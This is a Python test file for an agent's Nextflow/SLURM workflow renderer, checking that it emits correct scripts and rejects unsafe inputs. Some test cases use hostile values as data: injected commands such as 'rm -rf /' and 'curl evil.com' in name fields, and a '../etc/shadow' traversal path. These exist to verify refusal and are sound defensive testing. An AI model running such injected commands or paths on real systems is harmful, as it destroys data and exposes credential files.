"""
L14 — workflow_render's refuse-to-emit + correctness surface.

workflow_render is the per-project Nextflow renderer (per
project-nextflow-module-principles + project-per-project-pipelines):
strings in, strings out. main.nf / nextflow.config / launcher.sh.

These tests pin:
  - placeholder-cross-check: every `${X}` in `command` MUST be declared
    in inputs or outputs; every declared key MUST be referenced.
  - safe-token discipline on tool_name, workflow_name, slurm.partition,
    slurm.account, output filenames — refuses shell metacharacters.
  - absolute-path discipline on inputs, apptainer_sif — refuses `..`,
    relative paths.
  - module-token discipline on apptainer_module + nextflow_module.
  - slurm closed-key block: typos like `mem_gb` (instead of `mem`)
    raise.
  - main.nf has the literal command in `script:` with substituted
    `${params.X}` references (the human-readable-and-runnable test).
  - launcher.sh's SBATCH directives are emitted in the canonical order.
  - the Nextflow-quote helper refuses single quotes / newlines that
    would break out of the params block.
"""
from __future__ import annotations

import pytest

from agent.skills import workflow_render
from agent.skills.workflow_render import render_workflow


# ===========================================================================
# Happy path — the canonical samtools-view-on-a-BAM demo
# ===========================================================================

_DEMO_INPUTS = {
    "input_bam": "/work/users/u/s/user1/CLAUDE_TEST_PROJECTS/"
                 "phase_b_samtools_demo/inputs/test.bam",
}
_DEMO_OUTPUTS = {
    "output_bam": "filtered.bam",
}
_DEMO_COMMAND = "samtools view -b -h -F 4 ${input_bam} > ${output_bam}"
_DEMO_SLURM = {
    "time":  "00:30:00",
    "mem":   "4G",
    "cpus":  2,
    # no partition (a common CPU convention); cpus/ntasks default when omitted
}
_DEMO_SIF = "/work/users/u/s/user1/CLAUDE_GENOMES/samtools/samtools_1.21.sif"


def _demo_render() -> dict:
    return render_workflow(
        tool_name="samtools",
        command=_DEMO_COMMAND,
        inputs=_DEMO_INPUTS,
        outputs=_DEMO_OUTPUTS,
        apptainer_sif=_DEMO_SIF,
        apptainer_module="apptainer/1.4.1",
        nextflow_module="nextflow/25.04.7",
        slurm=_DEMO_SLURM,
        workflow_name="phase_b_samtools_demo",
    )


class TestHappyPath:
    @pytest.mark.integration
    def test_emits_three_files(self):
        out = _demo_render()
        assert set(out.keys()) >= {"main.nf", "nextflow.config", "launcher.sh"}
        assert all(isinstance(out[k], str) and out[k].strip()
                   for k in ("main.nf", "nextflow.config", "launcher.sh"))

    @pytest.mark.integration
    def test_main_nf_has_params_block_with_every_io(self):
        # Dot notation (params.x = 'y') — Groovy parses `params { ... }`
        # as a method call, which Nextflow rejects ("Unknown method
        # invocation `params`"). Pinned to dot notation per
        # Nextflow DSL2 conventions.
        out = _demo_render()
        nf = out["main.nf"]
        assert ("params.input_bam = '/work/users/u/s/user1/"
                "CLAUDE_TEST_PROJECTS/") in nf
        assert "params.output_bam = 'filtered.bam'" in nf
        assert f"params.apptainer_sif = '{_DEMO_SIF}'" in nf
        # Block syntax is explicitly NOT used — would be a regression.
        assert "params {" not in nf

    @pytest.mark.integration
    def test_main_nf_script_block_has_literal_command_with_substituted_params(self):
        # The script: block must be re-runnable by a human reading main.nf
        # and copy-pasting the line with the params filled in. We assert
        # the substituted form is present verbatim.
        out = _demo_render()
        nf = out["main.nf"]
        assert ("samtools view -b -h -F 4 ${params.input_bam} > "
                "${params.output_bam}") in nf

    @pytest.mark.integration
    def test_main_nf_runs_through_apptainer_exec(self):
        out = _demo_render()
        nf = out["main.nf"]
        assert "apptainer exec" in nf
        assert "${params.apptainer_sif}" in nf
        # The bind dir is the parent of the input BAM.
        assert ("--bind /work/users/u/s/user1/CLAUDE_TEST_PROJECTS/"
                "phase_b_samtools_demo/inputs") in nf

    @pytest.mark.integration
    def test_process_name_derived_from_tool(self):
        out = _demo_render()
        assert out["process_name"] == "run_samtools"
        assert "process run_samtools" in out["main.nf"]

    @pytest.mark.integration
    def test_launcher_has_all_sbatch_directives(self):
        out = _demo_render()
        sh = out["launcher.sh"]
        assert sh.startswith("#!/usr/bin/env bash\n")
        # The SBATCH block is the canonical set, no missing directives. Logs use
        # SLURM's %x (job-name) + %j (job-id) directives so they self-name.
        for line in [
                "#SBATCH --job-name=phase_b_samtools_demo",
                "#SBATCH --time=00:30:00",
                "#SBATCH --mem=4G",
                "#SBATCH --nodes=1",
                "#SBATCH --ntasks=1",
                "#SBATCH --cpus-per-task=2",
                "#SBATCH --output=%x-%j.out",
                "#SBATCH --error=%x-%j.err",
        ]:
            assert line in sh, f"missing SBATCH directive: {line!r}"
        # No --partition for a CPU job (the cluster default), no --account unless set.
        assert "#SBATCH --partition=" not in sh
        assert "#SBATCH --account=" not in sh

    @pytest.mark.integration
    def test_launcher_loads_required_modules_and_runs_nextflow(self):
        out = _demo_render()
        sh = out["launcher.sh"]
        assert "module purge" in sh
        assert "module load apptainer/1.4.1" in sh
        assert "module load nextflow/25.04.7" in sh
        assert "nextflow run main.nf -c nextflow.config" in sh

    @pytest.mark.integration
    def test_account_directive_only_emitted_when_supplied(self):
        out_no_acct = _demo_render()
        assert "--account" not in out_no_acct["launcher.sh"]
        out_with_acct = render_workflow(
            tool_name="samtools", command=_DEMO_COMMAND,
            inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
            apptainer_sif=_DEMO_SIF,
            apptainer_module="apptainer/1.4.1",
            nextflow_module="nextflow/25.04.7",
            slurm={**_DEMO_SLURM, "account": "user1_lab"},
            workflow_name="phase_b_samtools_demo")
        assert "#SBATCH --account=user1_lab" in out_with_acct["launcher.sh"]

    @pytest.mark.integration
    def test_param_keys_returned_for_caller(self):
        # The caller (submit_workflow_job) needs the param list to
        # decide what to upload, etc.
        out = _demo_render()
        assert set(out["param_keys"]) == {
            "input_bam", "output_bam", "apptainer_sif"}


# ===========================================================================
# Placeholder cross-check — the strict contract per principles
# ===========================================================================

class TestPlaceholderCrossCheck:
    @pytest.mark.integration
    def test_undeclared_placeholder_refused(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools",
                command="samtools view ${input_bam} > ${undeclared}",
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "undeclared" in str(exc.value)

    @pytest.mark.integration
    def test_unreferenced_declaration_refused(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools",
                command="samtools view ${input_bam} > ${output_bam}",
                inputs={**_DEMO_INPUTS,
                        "stray": "/work/users/u/s/user1/x.txt"},
                outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "not referenced" in str(exc.value)

    @pytest.mark.integration
    def test_input_and_output_overlap_refused(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools",
                command="samtools view ${shared} > ${output_bam}",
                inputs={"shared": "/work/users/u/s/user1/x.bam"},
                outputs={"shared": "out.bam", "output_bam": "y.bam"},
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "BOTH" in str(exc.value)


# ===========================================================================
# Safe-token discipline — anywhere a string ends up in a shell line
# ===========================================================================

class TestSafeTokenDiscipline:
    @pytest.mark.integration
    @pytest.mark.parametrize("field,kwarg", [
        ("tool_name",     {"tool_name": "samtools; rm -rf /"}),
        ("workflow_name", {"workflow_name": "demo && curl evil.com"}),
    ])
    def test_refuses_shell_metachars_in_top_level_strings(self, field, kwarg):
        kwargs = dict(
            tool_name="samtools", command=_DEMO_COMMAND,
            inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
            apptainer_sif=_DEMO_SIF,
            apptainer_module="apptainer/1.4.1",
            nextflow_module="nextflow/25.04.7",
            slurm=_DEMO_SLURM,
            workflow_name="demo")
        kwargs.update(kwarg)
        with pytest.raises(ValueError) as exc:
            render_workflow(**kwargs)
        assert "alnum" in str(exc.value)

    @pytest.mark.integration
    def test_refuses_path_separator_in_output_filename(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS,
                outputs={"output_bam": "subdir/out.bam"},
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "bare filename" in str(exc.value)

    @pytest.mark.integration
    def test_refuses_relative_path_in_inputs(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs={"input_bam": "relative/path.bam"},
                outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "absolute POSIX" in str(exc.value)

    @pytest.mark.integration
    def test_refuses_dotdot_in_inputs(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs={"input_bam": "/work/../etc/shadow"},
                outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert ".." in str(exc.value)

    @pytest.mark.integration
    def test_refuses_bad_module_token(self):
        with pytest.raises(ValueError):
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer; evil",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")


# ===========================================================================
# SLURM closed-key block — typo defense
# ===========================================================================

class TestSlurmClosedKey:
    @pytest.mark.integration
    def test_unknown_key_refused(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm={**_DEMO_SLURM, "mem_gb": 4},
                workflow_name="x")
        assert "unknown keys" in str(exc.value)
        assert "mem_gb" in str(exc.value)

    @pytest.mark.integration
    def test_missing_required_key_refused(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm={k: v for k, v in _DEMO_SLURM.items() if k != "mem"},
                workflow_name="x")
        assert "missing required" in str(exc.value)
        assert "mem" in str(exc.value)

    @pytest.mark.integration
    @pytest.mark.parametrize("bad_time", [
        "30min", "0:30", "abc", "00:30",  # missing seconds
    ])
    def test_refuses_malformed_time(self, bad_time):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm={**_DEMO_SLURM, "time": bad_time},
                workflow_name="x")
        assert "slurm.time" in str(exc.value)

    @pytest.mark.integration
    @pytest.mark.parametrize("bad_mem", ["4", "4GB", "fast"])   # "4g" IS valid (some sites use lowercase)
    def test_refuses_malformed_mem(self, bad_mem):
        with pytest.raises(ValueError):
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm={**_DEMO_SLURM, "mem": bad_mem},
                workflow_name="x")

    @pytest.mark.integration
    @pytest.mark.parametrize("bad_cpus", [0, -1, 257, "2"])
    def test_refuses_bad_cpus(self, bad_cpus):
        with pytest.raises(ValueError):
            render_workflow(
                tool_name="samtools", command=_DEMO_COMMAND,
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm={**_DEMO_SLURM, "cpus": bad_cpus},
                workflow_name="x")


# ===========================================================================
# Nextflow-quote helper — last-mile defense for the params block
# ===========================================================================

class TestNfQuote:
    @pytest.mark.integration
    def test_quotes_safe_string(self):
        assert workflow_render._nf_quote("/work/users/u/s/user1/x.bam") == \
            "'/work/users/u/s/user1/x.bam'"

    @pytest.mark.integration
    def test_refuses_single_quote(self):
        with pytest.raises(ValueError):
            workflow_render._nf_quote("oops'evil")

    @pytest.mark.integration
    def test_refuses_newline(self):
        with pytest.raises(ValueError):
            workflow_render._nf_quote("first\nsecond")


# ===========================================================================
# Command-line discipline
# ===========================================================================

class TestCommandLine:
    @pytest.mark.integration
    def test_refuses_multiline_command(self):
        with pytest.raises(ValueError) as exc:
            render_workflow(
                tool_name="samtools",
                command="samtools view ${input_bam}\n> ${output_bam}",
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")
        assert "single line" in str(exc.value)

    @pytest.mark.integration
    def test_refuses_empty_command(self):
        with pytest.raises(ValueError):
            render_workflow(
                tool_name="samtools", command="",
                inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS,
                apptainer_sif=_DEMO_SIF,
                apptainer_module="apptainer/1.4.1",
                nextflow_module="nextflow/25.04.7",
                slurm=_DEMO_SLURM,
                workflow_name="x")


# ===========================================================================
# The controlled SLURM convention: directives, defaults, email, GPU, and the
# env-policy merge (added when the CPU-omits-partition + %j-directives +
# job_manager-driven GPU design landed).
# ===========================================================================

def _render(slurm, workflow_name="job", email=None):
    kwargs = dict(
        tool_name="samtools", command=_DEMO_COMMAND,
        inputs=_DEMO_INPUTS, outputs=_DEMO_OUTPUTS, apptainer_sif=_DEMO_SIF,
        apptainer_module="apptainer/1.5.0", nextflow_module="nextflow/25.04.7",
        slurm=slurm, workflow_name=workflow_name)
    if email is not None:
        kwargs["email"] = email
    return render_workflow(**kwargs)["launcher.sh"]


class TestSlurmConvention:
    @pytest.mark.integration
    def test_minimal_request_applies_defaults(self):
        """Only time+mem required; cpus/ntasks default to 1, nodes=1 always."""
        sh = _render({"time": "01:00:00", "mem": "6G"})
        assert "#SBATCH --cpus-per-task=1" in sh
        assert "#SBATCH --ntasks=1" in sh
        assert "#SBATCH --nodes=1" in sh

    @pytest.mark.integration
    def test_output_error_use_slurm_directives(self):
        """Logs self-name with %x (job-name) + %j (job-id) directives."""
        sh = _render({"time": "01:00:00", "mem": "6G"})
        assert "#SBATCH --output=%x-%j.out" in sh
        assert "#SBATCH --error=%x-%j.err" in sh

    @pytest.mark.integration
    def test_cpu_job_omits_partition_and_account(self):
        sh = _render({"time": "01:00:00", "mem": "6G"})
        assert "#SBATCH --partition=" not in sh
        assert "#SBATCH --account=" not in sh
        assert "--gres" not in sh

    @pytest.mark.integration
    def test_lowercase_mem_accepted(self):
        """some sites write --mem=5g (lowercase)."""
        assert "#SBATCH --mem=45g" in _render({"time": "1-", "mem": "45g"})

    @pytest.mark.integration
    def test_email_lines_only_when_email_supplied(self):
        with_mail = _render({"time": "01:00:00", "mem": "6G"}, email="a@b.org")
        assert "#SBATCH --mail-type=END" in with_mail
        assert "#SBATCH --mail-user=a@b.org" in with_mail
        no_mail = _render({"time": "01:00:00", "mem": "6G"})
        assert "--mail-type" not in no_mail and "--mail-user" not in no_mail

    @pytest.mark.integration
    def test_invalid_email_refused(self):
        with pytest.raises(ValueError):
            _render({"time": "01:00:00", "mem": "6G"}, email="not-an-email")

    @pytest.mark.integration
    def test_gpu_job_renders_partition_qos_gres(self):
        sh = _render({"time": "2-", "mem": "20g", "cpus": 12, "gpus": 2,
                      "partition": "a100-gpu", "qos": "gpu_access"})
        assert "#SBATCH --partition=a100-gpu" in sh
        assert "#SBATCH --qos=gpu_access" in sh
        assert "#SBATCH --gres=gpu:2" in sh

    @pytest.mark.integration
    def test_gpu_without_partition_or_qos_refused(self):
        """A GPU count with no partition/qos would land on a CPU node — refuse."""
        with pytest.raises(ValueError, match="gpus"):
            _render({"time": "1:00:00", "mem": "8G", "gpus": 1})

    @pytest.mark.integration
    def test_multi_partition_comma_allowed(self):
        sh = _render({"time": "2-", "mem": "20g", "gpus": 1,
                      "partition": "a100-gpu,l40-gpu", "qos": "gpu_access"})
        assert "#SBATCH --partition=a100-gpu,l40-gpu" in sh


class TestSlurmPolicyMerge:
    """render_workflow_files merges the env's slurm policy + email into the
    per-job request (_resolve_slurm_and_email)."""

    @pytest.mark.integration
    def test_email_pulled_from_env(self):
        from agent.skills.submit_workflow import _resolve_slurm_and_email
        merged, email = _resolve_slurm_and_email(
            {"time": "1:00:00", "mem": "4G"},
            {"name": "c", "type": "ssh", "email": "aaron@tislab.org"})
        assert email == "aaron@tislab.org"

    @pytest.mark.integration
    def test_account_and_default_partition_from_env(self):
        from agent.skills.submit_workflow import _resolve_slurm_and_email
        merged, _ = _resolve_slurm_and_email(
            {"time": "1:00:00", "mem": "4G"},
            {"name": "c", "type": "ssh",
             "slurm": {"account": "lab1", "partition": "general"}})
        assert merged["account"] == "lab1"
        assert merged["partition"] == "general"

    @pytest.mark.integration
    def test_gpu_partition_qos_from_env_convention(self):
        from agent.skills.submit_workflow import _resolve_slurm_and_email
        merged, _ = _resolve_slurm_and_email(
            {"time": "2-", "mem": "20g", "gpus": 1},
            {"name": "c", "type": "ssh",
             "slurm": {"gpu": {"partition": "a100-gpu", "qos": "gpu_access"}}})
        assert merged["partition"] == "a100-gpu"
        assert merged["qos"] == "gpu_access"

    @pytest.mark.integration
    def test_gpu_request_refused_when_env_has_no_gpu_convention(self):
        from agent.skills.submit_workflow import _resolve_slurm_and_email
        with pytest.raises(ValueError, match="GPU is not configured"):
            _resolve_slurm_and_email(
                {"time": "2-", "mem": "20g", "gpus": 1},
                {"name": "plain", "type": "ssh"})

    @pytest.mark.integration
    def test_cpu_job_drops_qos_and_omits_policy_when_env_bare(self):
        from agent.skills.submit_workflow import _resolve_slurm_and_email
        merged, email = _resolve_slurm_and_email(
            {"time": "1:00:00", "mem": "4G", "qos": "sneaky"},
            {"name": "bare", "type": "ssh"})
        assert "qos" not in merged          # qos is GPU-only in our convention
        assert "partition" not in merged and "account" not in merged
        assert email == ""


class TestNextflowMemoryNormalization:
    @pytest.mark.integration
    @pytest.mark.parametrize("mem,expected", [
        ("20g", "'20GB'"), ("6G", "'6GB'"), ("12000M", "'12000MB'"),
    ])
    def test_process_memory_is_uppercase_nextflow_unit(self, mem, expected):
        cfg = render_workflow(
            tool_name="samtools", command=_DEMO_COMMAND, inputs=_DEMO_INPUTS,
            outputs=_DEMO_OUTPUTS, apptainer_sif=_DEMO_SIF,
            apptainer_module="apptainer/1.5.0", nextflow_module="nextflow/25.04.7",
            slurm={"time": "1:00:00", "mem": mem}, workflow_name="m",
        )["nextflow.config"]
        assert f"memory = {expected}" in cfg
